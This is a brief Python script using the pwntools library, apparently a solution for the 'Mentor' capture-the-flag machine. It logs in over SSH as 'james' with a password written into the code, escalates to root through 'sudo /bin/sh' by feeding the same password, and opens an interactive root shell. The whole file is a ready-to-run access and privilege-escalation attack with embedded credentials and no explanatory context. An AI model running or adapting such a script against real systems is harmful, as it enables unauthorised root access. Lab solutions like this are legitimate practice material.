import requests



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Mentor - Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)
request = ssh(host="10.10.11.193", user="james", password="SuperSecurePassword123__")
shell = request.process("/bin/sh")
time.sleep(0.5)
shell.sendline(b"sudo /bin/sh")
time.sleep(0.5)
shell.sendline(b"SuperSecurePassword123__")
time.sleep(0.5)
shell.sendline(b"whoami")
shell.sendline(b"whoami")
shell.interactive()
